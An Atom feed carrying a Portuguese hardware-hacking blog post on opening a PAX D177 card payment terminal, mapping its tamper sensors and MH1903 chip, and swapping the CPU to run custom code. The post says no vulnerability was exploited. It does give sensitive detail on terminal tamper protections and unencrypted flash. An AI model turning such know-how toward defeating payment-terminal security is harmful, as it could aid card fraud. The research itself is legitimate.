<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="pt" /><updated>2025-09-05T22:00:48+00:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletrônica, Computação, Física.  Todos os hacks que eu fizer, serão colocados aqui. Aceito sugestões :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">Rodando código em uma máquina de cartão de crédito PAX (parte 1)</title><link href="https://lucasteske.dev/2025/09/running-code-in-pax-machines" rel="alternate" type="text/html" title="Rodando código em uma máquina de cartão de crédito PAX (parte 1)" /><published>2025-09-05T19:30:00+00:00</published><updated>2025-09-05T19:30:00+00:00</updated><id>https://lucasteske.dev/2025/09/running-code-in-pax-machines</id><content type="html" xml:base="https://lucasteske.dev/2025/09/running-code-in-pax-machines"><![CDATA[<h2 id="disclaimer">Disclaimer</h2>

<p><strong>Todos os procedimentos descritos aqui foram feitos com material disponível publicamente</strong> - Nenhuma falha de segurança foi realmente explorada aqui para obter execução de código. A técnica de troca de processador <strong>não contorna as proteções contra violações nem permite que uma máquina falsa efetue pagamentos.</strong></p>

<p>As máquinas de pagamento com cartão de crédito no Brasil <em>geralmente</em> estão no estado da arte em relação às medidas de segurança. Lembro-me uma vez que um funcionário da Elavon me disse que <strong>o Brasil recebeu todos os primeiros lançamentos de máquinas e sistemas de pagamento</strong>. Quando perguntei por que, ele disse: <strong>as fraudes no Brasil são sofisticadas o suficiente, que se o sistema for seguro o suficiente para o Brasil, funciona em qualquer lugar do mundo</strong>.</p>

<p>No futuro, farei um artigo sobre as medidas de segurança que tanto a MegaHunt, quanto a PAX e as empresas brasileiras implementam em suas máquinas para evitar que os sistemas sejam adulterados.</p>

<p>Se você estiver compartilhando / comentando sobre este artigo, por favor coloque o mesmo aviso de isenção de responsabilidade lá. Não me importo de usar as informações aqui para fazer novos artigos, mas o Brasil sofre <strong>muito</strong> com fake news (especialmente envolvendo hardware de segurança feito aqui) e alguém pode pensar que isso torna possível hackear seus cartões de crédito ou contas (você sabe, pessoas sem conhecimento suficiente para realmente entender o que está envolvido).</p>

<h3 id="notas-iniciais">Notas iniciais</h3>

<p>Este artigo está meio incompleto. Ainda vou publicar a engenharia reversa do boot rom e como criei um emulador para mapear melhor o que os firmwares fazem. Aqui eu apenas menciono brevemente que fiz um emulador e acho que isso merece seu próprio artigo. Vou atualizar esta nota inicial quando eles forem publicados.</p>

<p>Eu quero agradecer ao <a href="https://www.linkedin.com/in/gutem/">Gutem</a> e ao <a href="https://www.instagram.com/penegui">Penegui</a> por uma revisão técnica rapida do conteúdo do artigo, e a Pag, a qual deu uma resposta super rápida e amigável quando enviei este artigo a eles. Uma pequena linha do tempo de como rolou o processo está no fim da pagina.</p>

<h2 id="máquinas-de-pagamento-com-cartão-de-crédito">Máquinas de pagamento com cartão de crédito</h2>

<p>Aqui no Brasil, existem várias empresas que atuam como gateways de pagamento e esse tipo de coisa. Eu diria que as maiores são <a href="https://pagbank.com.br/">PagSeguro</a> e <a href="https://mercadopago.com.br/">MercadoPago</a>. Enquanto o PagSeguro é originalmente do Brasil, o MercadoPago é da Argentina e veio de um negócio completamente diferente (MercadoLivre, que é basicamente o equivalente sul-americano do eBay).</p>

<p>Há também muitos bancos que hoje em dia possuem máquinas de pagamento, mas eu diria que a maioria deles, senão todos, compram as máquinas de um fabricante brasileiro chamado <a href="https://www.tectoy.com.br/">TecToy</a> (o que anteriormente era feito pela <a href="https://www.transire.com/">Transire</a>, mas agora eles fundiram e são a mesma empresa).</p>

<p>E eu acho muito engraçado, porque a TecToy é uma fabricante de brinquedos, mas eles são enormes e antigos e uma das poucas empresas sobreviventes que <strong>realmente fabricam hardware</strong> no Brasil. Vale ressaltar que as máquinas não são projetadas por eles, mas principalmente por OEMs chineses como a <a href="https://www.paxglobal.com.hk/">PAX</a> ou <a href="https://www.sunmi.com/">Sunmi</a>.</p>

<p>No Brasil, é muito fácil e barato para conseguir estas máquinas basicamente em qualquer lugar. Você consegue achar as máquinas descritas aqui no próprio site das empresas de pagamento (tente procurar Máquinas de Cartão no mercado livre ou google ;D )</p>

<p>Em resumo: Geralmente elas são máquinas baseadas na PAX, com o mesmo “Sistema Operacional” mas uma aplicação especifica customizada. Além disso a Pag também faz serviço de “OEM” e <strong>muitas</strong> empresas de pagamento usam as máquinas deles como base. Então basicamente, se você comprar uma máquina de cartão qualquer, a grande chance é que seja indiretamente deles também.</p>

<p>Pra simplificar, aqui estão as correspondências dos modelos para a PAX:</p>

<ul>
  <li>Mini Chip 3 - PAX D188 (Baremetal)</li>
  <li>Moder Plus 2 - PAX D195 (Linux OS)</li>
  <li>Moder Pro 2 - PAX Q92S (Linux OS)</li>
  <li>Mini NFC 2 - PAX D177 (Baremetal)</li>
  <li>Mini Smart 2 - Sunmi P2 (Android)</li>
</ul>

<p>Pra esse artigo eu acabei usando uma NFC2 que é uma simples e barata PAX D177. Vale notar que a D188 parece uma máquina completamente diferente, mas usa o mesmo processador (apenas em formato BGA e não QFN88), tem um modem 4G a mais e uma tela maior. A firmware que roda em ambas <strong>é a mesma</strong> (runtime selection).</p>

<h2 id="primeiros-trabalhos-e-identificação-de-coisas">Primeiros trabalhos e Identificação de coisas</h2>

<p>Geralmente quando estou fazendo engenharia reversa em hardwares considerados seguros, eu peço <strong>pelo menos</strong> três máquinas quando possível. Por que geralmente rola da seguinte maneira:</p>

<ol>
  <li>Vou abrir, e deixar <strong>todas</strong> proteções dispararem.</li>
  <li>Vou usar para <strong>tentar</strong> bypassar todas proteções (caso seja meu objetivo)</li>
  <li>Vou manter como está, para poder ter um modelo de referência para os estudos.</li>
</ol>

<p>Nesse cenário especifico, eu apenas queria rodar DOOM nela. Por que, se compute, ela precisa de DOOM.</p>

<p>Baseado nas minhas experiencias anteriores fazendo engenharia reversa nestas maquinas, eu já sabia o que esperar. Este artigo é apenas um resumo do caminho (dado que levei alguns anos pra chegar ao estado atual) que me lembro que segui. Então o que eu estava esperando era basicamente isso:</p>

<ol>
  <li>Segurança pesada
    <ol>
      <li>Proteção contra tamper</li>
      <li>Proteção contra clock-glitching</li>
      <li>Proetção contra manipulacao de RNG</li>
      <li>Assinaturas de código</li>
      <li>Criptografia de Código</li>
    </ol>
  </li>
  <li>Muita frustração</li>
</ol>

<p>Eu podia seguir dois caminhos: exploitar o código que roda, ou trocar a CPU. Para exploitar, eu teria que achar uma falha de segurança que permitisse execução de código via Bluetooth, Smartcard, NFC ou USB, dado que estas são as únicas interfaces disponíveis. Para isso, eu teria que ter todo código, e como vocês vão ver mais pra frente, para está maquina em especifico, isso não era exatamente possível.</p>

<p>Segundo jeito era basicamente ver qual CPU estava na placa, comprar uma nova e trocar. O problema mesmo, é achar a CPU pra vender.</p>

<p>Mas, de um jeito ou de outro, eu precisaria abrir e identificar como as coisas estão ligadas e o que é usado. De referência, esta é a maquina que usei:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cb3d6416e80906d1e1a3cfa7c27ec46c_MD5.jpeg" alt="" /></p>

<p>No lado de trás, alguns parafusos que são facilmente removidos. Eu geralmente faço isso com a <strong>máquina ligada</strong>, pois desta maneira consigo ver que ações minhas acionam as proteções anti-tamper.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/942368afcd3a8b5c2f6280b0686279ad_MD5.jpeg" alt="" /></p>

<p>Remover os parafusos, porém, não disparou nenhuma proteção. Apesar disso, assim que a tampa é removida, a tela indica que duas proteções foram acionadas.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9a88c682e238fdb16c61122c76c2e14c_MD5.jpeg" alt="" /></p>

<p>na parte de trás do case, há alguns pontos de borracha-carbono, que encostam nos pontos de detecção na PCB. Eles funcionam basicamente da mesma maneira que os botões de um controle de video-game funcionam, só que neste caso, eles só garantem que “o botão está sempre apertado”.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3744913eb7cc7b866b64eb363d6fbbe5_MD5.jpeg" alt="" /></p>

<p>E por alguma razão, a máquina decidiu falar pra gente quais pontos de tamper foram acionados :)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9b728a005ceb00f991633d8d6ece65ed_MD5.jpeg" alt="" /></p>

<p>Ah, isso também reseta pelo boot, então se você soldar os pinos de tamper (pra forçar eles a ficarem em contato) você consegue identificar os nomes de cada um hehe :)</p>

<p>Então, isso é a parte de baixo. Podemos ver algumas coisas, por exemplo a bateria-moeda na esquerda e uma grande PCB verde que parece inútil. Ela basicamente está em cima de todo circuito de leitura do cartão e os controladores da máquina.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/4454b7008ef72e53db283abd4afafb86_MD5.jpeg" alt="" /></p>

<p>Porém, mesmo que pareça inútil esta PCB, não a subestime: ela é basicamente uma PCB de 4 layers com uma mesh DENSA dentro dela. Qualquer dano ou remoção, aciona outro ponto de tamper. Só pra ter uma ideia, isso daqui é a PCB escaneada:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/930418d0ee33dd3362d0ac27de43fa8e_MD5.jpeg" alt="" /></p>

<p>Removendo todo plástico e a PCB, chegamos a placa principal:
<img src="/assets/Running code in a PAX Credit Card Payment Machine/1d47f48f4cf614dd72e26c37c839895c_MD5.jpeg" alt="" /></p>

<p>E temos muitas coisas aqui, mas as coisas que nos importam estão na parte de baixo.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/e808d21c32ba0866a386d155077709e4_MD5.jpeg" alt="" /></p>

<p>Aqui conseguimos ver algumas coisas interessantes:</p>

<ul>
  <li>MH1903 - Nosso principal SoC (CPU)</li>
  <li>NXP 8035S - PHY de Interface de SmartCard</li>
  <li>FM17660 - Leitor NFC</li>
  <li>XM25Q65 - Memória Flash SPI de 16MB</li>
</ul>

<p>(E como você adivinhou, ativamos quase todos os pontos de tamper na parte de trás)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/55e76a7d0d22410d56bada5afad18bd8_MD5.jpeg" alt="" /></p>

<p>A memória flash, conseguimos dumpa-la. Eu tenho amostras tanto com tamper quanto sem tamper. O bypass da detecção de tamper fica como exercicio ao leitor :) - Mas se você quiser entender como funciona, você pode dumpar ela diretamente mesmo com tamper, por que o tamper não apaga a memória flash inteira, apenas a porção onde tem conteúdo sensível para comunicação com os servidores de pagamento.</p>

<p>Eu estava esperando que a memória flash fosse sempre criptografada, mas não é. Apesar disso, não dá pra mudar os conteúdos (código) dela pois é tudo assinado. então conseguimos usar para engenharia reversa, mas não para execução de código. Ainda assim, é massa. Temos 16MB de flash, então podemos colocar um WAD inteiro do DOOM nela! :D</p>

<h2 id="o-que-sabemos-sobre-o-mh1903">O que sabemos sobre o MH1903</h2>

<p>Aqui é quando bicho pega. O SoC está por trás de um véu de obscuridade. O núcleo é feito pela megahunt, que basicamente só provê essas informações:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cf4f007fbd8b87c83cb0e4f3c3560cc7_MD5.jpeg" alt="" />
(veja <a href="https://www.megahuntmicro.com/en/index.php?catid=5">https://www.megahuntmicro.com/en/index.php?catid=5</a> )</p>

<p>Indo um pouco mais a fundo no google, a gente consegue achar algumas informações a mais de alguns vendedores. Ele tem <strong>muitas</strong> variações, mas em resumo, o núcleo é o mesmo. Só mudando quantos pinos estão expostos, quantidade de memória flash, ram etc… Essa versão especifica é a QFN88, que tem essas especificações:</p>

<ul>
  <li>RAM: 1MB</li>
  <li>FLASH: 1MB</li>
  <li>SPI: 4</li>
  <li>ADC: 5</li>
  <li>DAC: 1</li>
  <li>GPIO: 64</li>
  <li>USB: 1</li>
  <li>Serial: 4</li>
</ul>

<p>Como vocês podem ver, essa versão tem uma memória flash inteira, o que é uma pena pra mim. Ainda estou montando meu equipamento para inspeções diretas no chip. Eu já fiz alguns decaps, e a memória flash não está embutida no mesmo silicio, mas apenas colada em cima do chip principal e ligada através de fios. Eu ouvi alguns amigos da industria de semicondutores dizer, que a razão disso é que o processo de fabricação entre memórias flash e CPUs diferente um pouco e é difícil unificar ambos. Por isso, geralmente é preferível faze-los separados (especialmente caso precise de uma densidade muito alta).</p>

<p>Uma coisa pra se notar, as versões BGA do SoC não tem memória flash embutida, então elas são obrigadas a carregar de uma flash externa. Spoiler: A D188 tem duas memórias flash na placa :)</p>

<p>E também temos uma variante MH1903S, que tem mais flash, mas menos RAM / GPIO / SPI</p>

<ul>
  <li>RAM: 640KB</li>
  <li>FLASH: 4MB</li>
  <li>SPI: 3</li>
  <li>ADC: 6</li>
  <li>DAC: 1</li>
  <li>GPIO: 56</li>
  <li>USB: 1</li>
  <li>Serial: 3</li>
</ul>

<p>Então, o google não me deu muita informação sobre, apesar de eu ter achado <em>algumas</em> SDK no github (a maioria mirror dos git chinês) e eu tive que recorrer ao Baidu. Essa parte levou um bom tempo, por que muitas informações não estão disponível fora da china continental, e existem muitas variações do MH1903. Eu achei vários datasheets com informações conflitantes, e boa parte deles eu tive que pagar para baixar do CSDN. Por sorte, existem alguns brokers que fazem isso por você. No fim desta página há um link com todos os datasheets relevantes que eu achei, caso você precise. Só esteja avisado: Mesmo neles, há muita informação omitida e conflitante.</p>

<p>Tá, mas como testei então todas as suposições que fiz sobre o chip? Bom, eu achei <em>por um acaso</em> que existe uma placa chinesa similar ao Arduino, feito pela LUAT chamada AIR105. Parece nada a ver, mas uma pesquisa no baidu indicou que o AIR105 usa um núcleo MH1903S. E o lado bom, AIR105 é fácilmente comprável na Aliexpress: <a href="https://s.click.aliexpress.com/e/_oBLNTrc">https://s.click.aliexpress.com/e/_oBLNTrc</a></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/427a383619233fb72eef5161e05511e8_MD5.jpeg" alt="" /></p>

<p>Eu compreo alguns, decapei alguns e adivinha só: realmente é um MH1903S :D</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9138886ea831b06c18888099fd0e26a6_MD5.jpeg" alt="" /></p>

<p>Pra comparação, eu também decapei um SoC da máquina, e a escrita indicava 1903A:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/feb55758da95a7ecb62f02451c058606_MD5.jpeg" alt="" /></p>

<p>Ah, e lembra que falei que a memoria flash era colada no chip principal? Aqui tá uma foto mostrando ambos (E malz, eu ainda não fiz um equipamento pra focus stacking). A memória flash está fora de foco na direita. Os boundwires estão mortos por que usei ácido nítrico 78% e os fios eram de cobre.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/551efee7006a314cf9d0b9257bb61edc_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/4fd85cc5f052df9b22c267e7559b0af5_MD5.jpeg" alt="" /></p>

<p>Então basicamente, eu poderia assumir que eles são pelo menos similares. Os Datasheets de ambos também dizem a mesma coisa (única diferença mesmo é flash e ram).</p>

<p>O diagrama de blocos pra essa CPU está no datasheet, e é basicamente <strong>a única</strong> informação que bate em relação a todos datasheets:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8cd0cc82e5b752464a0617442e0c765f_MD5.jpeg" alt="" /></p>

<p>O SC300 é na verdade uma especificação de ARM chamada <strong>SecurCore</strong>. É um Cortex M3 (no caso do MH190x é um M4F) com alguns recursos de segurança. Por exemplo, mesmo eles sendo simples processadores ARM de 32 bit, eles tem algumas proteções de memória para restringir acessos entre OS &lt;&gt; APP (uma versão primitiva do TrustZone). Ah e claro, as especificações oficiais só estão disponíveis através de NDA, então só podemos deduzir o que exatamente a especificação diz. Pra uma ideia: As CPUs no seu cartão de crédito, seguem a mesma especificação.</p>

<p>Os datasheets também especificam um mapa da memória, o qual todos datasheets concordam. Porém, <strong>claramente</strong> não é tudo que o dispositivo tem. Por exemplo, a MH diz que a CPU tem acelerador de RSA, AES e hashes via hardware, mas não existe nenhuma descrição deles no datasheet. Depois eu descobri que eles só estão obscurecendo o conteúdo ou precisam de um NDA. Eu vou eventualmente fazer engenharia reversa de todos aplicativos que eu dumpei e também de uns binarios de SDK que eu achei pela internet. Ah, e por favor, se esses endereços baterem com algum dispositivo que você usa, me avise. Na minha experiência os dispositivos chineses tentam ser compatíveis com alguma coisa do mercado, mas nada que achei indica ser um clone direto de algum SoC do mercado. (Eu especulei ser um STM32 ou ATMSAMD, mas não bate).</p>

<table>
  <thead>
    <tr>
      <th>Address Range</th>
      <th>Peripheral name</th>
      <th>Bus Name</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x4000_0000-0x4000_03FF</td>
      <td>SSC</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0800-0x4000_0BFF</td>
      <td>DMA</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0C00-0x4000_0FFF</td>
      <td>USB</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_1000-0x4000_13FF</td>
      <td>LCD</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_8000-0x4000_BFFF</td>
      <td>OTP</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4006_0000-0x4006_FFFF</td>
      <td>DCMI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4008_0000-0x4008_FFFF</td>
      <td>CACHE</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_2000-0x400A_2FFF</td>
      <td>QSPI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_3000-0x400A_3FFF</td>
      <td>SPIM5</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4001_0000-0x4001_0FFF</td>
      <td>SCI0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_2000-0x4001_2FFF</td>
      <td>CRC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_3000-0x4001_3FFF</td>
      <td>Timer0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_4000-0x4001_4FFF</td>
      <td>ADC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_5000-0x4001_5FFF</td>
      <td>SCI2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_6000-0x4001_6FFF</td>
      <td>UART0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_7000-0x4001_7FFF</td>
      <td>UART1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_8000-0x4001_8FFF</td>
      <td>SPIM1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_9000-0x4001_9FFF</td>
      <td>SPIM2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_A000-0x4001_AFFF</td>
      <td>SPIM0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_B000-0x4001_BFFF</td>
      <td>SPIS0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_C000-0x4001_CFFF</td>
      <td>Watchdog</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_D000-0x4001_DFFF</td>
      <td>GPIO</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_E000-0x4001_EFFF</td>
      <td>TRNG</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_F000-0x4001_FFFF</td>
      <td>SYS_CTRL</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4002_0000-0x4002_FFFF</td>
      <td>MSR</td>
      <td>APB1</td>
    </tr>
    <tr>
      <td>0x4003_0000-0x4003_7FFF</td>
      <td>BPU</td>
      <td>APB2</td>
    </tr>
    <tr>
      <td>0x4004_4000-0x4004_4FFF</td>
      <td>UART2</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_5000-0x4004_5FFF</td>
      <td>UART3</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_8000-0x4004_8FFF</td>
      <td>KEYBOARD</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_9000-0x4004_9FFF</td>
      <td>I2C0</td>
      <td>APB3</td>
    </tr>
  </tbody>
</table>

<p>A RAM está mapeada no lugar esperado pra esses ARM Cortex. Começa em 0x2000_0000 e vão até o tamanho máximo da RAM (640KB pro MH1903S e 1MB pro MH1903). As bit-bands também estão no lugar esperado, 0x2200_0000 pra RAM. Também há mais devices que não estão listados acima, esses terão seu próprio artigo depois que eu terminar de mapear tudo.</p>

<p>O datasheet principal mostra duas variantes do QFN88, uma tendo um sufixo <code class="language-plaintext highlighter-rouge">_J</code>. A versão não J tem um regulador 3.3V interno, que é muito bom para placas tipo o AIR105. Fazendo engenharia reversa da placa da D177, parece que o pin-out bate exatamente com a variante J. Vocês verão que eu tive um grande problema por que eu assumi que o datasheet estava correto XD</p>

<h2 id="descobrindo-como-as-coisas-estão-conectadas">Descobrindo como as coisas estão conectadas</h2>

<p>A primeira coisa que preciso descobrir é <strong>pelo menos</strong> onde a UART está (se está). Eu sei que o USB da máquina é fixo, por que os pinos são fixos. Mas por alguma razão eu não consegui ativar a bootrom pela USB então tive que caçar a UART.</p>

<p>Os pinos da UART geralmente estão exposto de alguma maneira, para diagnósticos durante a fabricação. Isso ou o JTAG (ou mais especificamente aqui, o SWD). Porém no caso desse micro controlador, eles estão desativados durante o boot, então decidi não perder muito tempo tentando achar eles na placa.</p>

<p>Tá, mas como eu consigo achar as coisas na placa? Bom, eu geralmente removo <strong>todos</strong> componentes da placa e faço um scan dela (usando scanner normal de papel). E aí eu faço um overlay com o pinout da CPU e traço até onde vai. Uma boa aplicação pra isso é o <a href="https://inkscape.org/">Inkscape</a>. Ele permite desenhar tudo vetorizado e as imagens de scanner doméstico tem 1:1 com tamanho real dela (então caso você precise de medidas, elas são realistas).</p>

<p>Então desenho retângulos cinzas e coloco os nomes:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/bacf2a2ebe249871db70adb98d4fa2b7_MD5.jpeg" alt="" /></p>

<p>Eu também marco as vias, por que essas placas costumam ser multi-layer e você vai precisar de tudo pra seguir elas:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fdeaa9034f0f2a2217c7d55f05e2e6f4_MD5.jpeg" alt="" /></p>

<p>Por exemplo, o TX e RX passa através da parte frontal da PCB também (esquece esse desalinhamento, nao sei por que a imagem bugou).</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/652fd1331e348c4861938eadf3f0a824_MD5.jpeg" alt="" /></p>

<p>Depois de seguir tudo, eu cheguei em 2 de 5 testpads, no canto direito da parte de trás da PCB, os quais marquei também no Inkscape.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/985831c28a29ecc016e52f876980476a_MD5.jpeg" alt="" /></p>

<p>Agora que eu tinha a UART, eu poderia usa-la para reprogramar a máquina após a troca da CPU. E pra aqueles que estão pensando: a UART, para a aplicação da máquina, é basicamente a mesma coisa do USB e do bluetooth, então (geralmente) não há leak de informações ali. É exatamente o que o aplicativo móvel acessa. E caso você queira explorar, você pode usar USB ou Bluetooth que elas vão agir da mesma maneira desta UART.</p>

<h2 id="troca-de-cpu">Troca de CPU</h2>

<p>Um dos jeitos mais fáceis que eu consigo rodar um código nela e pulando a parte de tentar bypassar o secureboot, é apenas comprar uma CPU nova e trocar. Alguns podem considerar isso uma vulnerabilidade, mas eu pessoalmente não considero: Mesmo que alguém tenha acesso a todo código que roda nas máquinas, ainda assim eles precisam das chaves e dos dados carregados na NVRAM para a transação de cartão. Eu já vi uns tempos atrás o caso de algumas máquinas que armazenavam isso na memória flash (então se você quebrasse a CPU antes de ela detectar o tamper, o conteúdo estava lá). Mas este não é o caso desta máquina.</p>

<p>Infelizmente esses MH1903 são bem raros pra comprar fora da china continental. De tempos em tempos eles aparecem na Aliexpress. Aqui está um link <a href="https://s.click.aliexpress.com/e/_oBMot6n">https://s.click.aliexpress.com/e/_oBMot6n</a> embora ele provavelmente vai estar morto quando você estiver lendo isso.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/c94d5244a68733e5cfbec91c6f08f5f0_MD5.jpeg" alt="" /></p>

<p>É uma CPU bem cara, R$34 de CPU e ainda R$15 de taxad por dispositivo. E ainda tem os R$28 de frete. Eu comprei 5 deles (caso eu precisasse de mais) e saiu por volta de R$150 com o frete.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/edad8e809adbb209bf4eca20043fd1dd_MD5.jpeg" alt="" /></p>

<p>Uns anos atrás eu tentei trocar a CPU dessa maquina sem nenhum sucesso. Então eu pensei que a variante que eu tinha não era a J, mas a mesma do AIR105 (o que faria sentido) e isso me deixou triste. Mas recentemente eu estava colecionando as bootroms, e decidi trocar um AIR105 por um MH1903 que comprei apenas para dumpar o bootloader (mais bootloaders == mais informações).</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8fabf3473c8ee086fdea127b537c4ef6_MD5.jpeg" alt="" /></p>

<p>E depois de fazer isso, eu percebi que a placa estava full morta. Nenhuma energia além dos 5V. Depois de trocar eu notei uma coisa no datasheet:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/725ff8aa056e6d095a4ac1ea1882fa1a_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/839cea0de243ff5cc485a19e6a0fb849_MD5.jpeg" alt="" /></p>

<p>Uma das diferenças entre o J e não J, é que a versão <strong>não J</strong> (nesse caso AIR105) tem um LDO interno de 3.3V. E olhando os esquemáticos do AIR105, adivinha só? Não existe nenhum outro regulador na placa. É tudo alimentado por esse LDO.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/87356f1a4622aa38a746dd5676123bf5_MD5.jpeg" alt="" /></p>

<p>Então, fazia sentido não ter nada no 3.3V dado que a versão J nao tinha o regulador. Então eu decidi novamente trocar a CPU da D177. Pra isso, eu decidi começar do zero: Máquina recém tirada da caixa e um MH1903 que nao tinha usado. O resultado? Nada ainda. Nada na UART, nada na USB (e ambos deveriam ter atividade da bootrom).</p>

<p>O que acontecia é que, a bootrom nunca respondia as chamadas de handshake do meu leitor, o que era estranho. Decidi tentar no AIR105, até que notei que a placa sempre resetava quando eu enviava o sinal RTS na porta serial.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fd96942840f9a3924a76e5d843ee88a2_MD5.jpeg" alt="" /></p>

<p>Isso me fez pensar: como ele tava resetando a placa? Olhando pela pinagem do chip, não existe reset. Mas olhando pelo esquema do AIR105 vemos uma coisa interessante:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/217023812ae3d8552e72a67306105efa_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/0c7f3862853471f760b69c71098168a4_MD5.jpeg" alt="" /></p>

<p>Basicamente a placa, não tinha a bateria-moeda onde deveria ter, só um capacitor pra emular (o XH311H no esquemático, era basicamente um conector nao populado), e o que o pino de reset fazia na verdade era <strong>colocar essa bateria em curto</strong> fazendo ela marcar 0V. E adivinha só? O datasheet estava me falando o tempo todo, mas minha falta de experiência lendo chines só passou batido 😆</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/7a75d13b7c4758f46f7c29717f7907cd_MD5.jpeg" alt="" />
Pra aqueles (como eu) que estão enferrujados no Chines, o texto acima basicamente diz: Alimentação da bateria, precisa ser energizado caso contrario o chip não funciona.</p>

<p>Então eu investiguei um pouco mais a bootrom (ainda vou postar detalhes da engenharia reversa da bootrom desse chip) e notei que o que acontece é: Quando o VBAT33 cai para baixo de 2.3V, ele aciona um tamper na CPU. O jeito que a CPU lida com esse tamper, é basicamente se resetar, o que apaga a NVRAM e seta alguns registradores que podem ser lidos pela bootrom ou pela aplicação. Então basicamente, o botão de reset do AIR105 é um botão de tamper 😆</p>

<p>Olhando na PCB da D177, não há nenhum testpad especifico para atuar como reset, mas geralmente para evitar que a bateria seja usada quando existe energia externa, colocam um diodo em série com ela a maneira de isolar ela. Posso soldar um fio nesse diodo para usar como reset. Seguindo os traços na PCB, achei um diodo na borda da placa.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/ea6eb39aabf1f914c71bda9f6eb79907_MD5.jpeg" alt="" /></p>

<p>Então apenas soldei um fio, abri meu <a href="https://github.com/racerxdl/air105-uploader/">air105-uploader</a> e manualmente setei ele pro GND. E <strong>PROFIT</strong>:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/a4da09ed6fa71e3bd9b38a0097594756_MD5.jpeg" alt="" /></p>

<p>Agora eu consigo rodar código na máquina!!!</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3247c212e1baa37421f763ede653c022_MD5.jpeg" alt="" /></p>

<h2 id="construindo-código-para-isso">Construindo código para isso</h2>

<p>Não vou entrar em muitos detalhes aqui (já que este artigo já está ficando maior do que eu esperava), mas o resumo é: o LuatOS fornece uma maneira de construir coisas e tem um “boilerplate” para inicializar todas as coisas do lua. O próprio CPU é um ARM Cortex, então é facilmente construível pelo GCC, apenas requerendo um script de ligação personalizado para juntar tudo no lugar certo.</p>

<p>Basicamente, reutilizei quase tudo que fiz para o AIR105, apenas mudei o script de ligação para estar ciente de que o MH1903 na verdade tem 1MB de RAM em vez de 640KB. Para torná-lo mais fácil de usar, criei algumas libs para <a href="https://platformio.org/">platform.io</a> que você pode usar diretamente.</p>

<p>Se você quiser experimentar, basta instalá-lo através do pip.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install</span> <span class="nt">-U</span> platformio
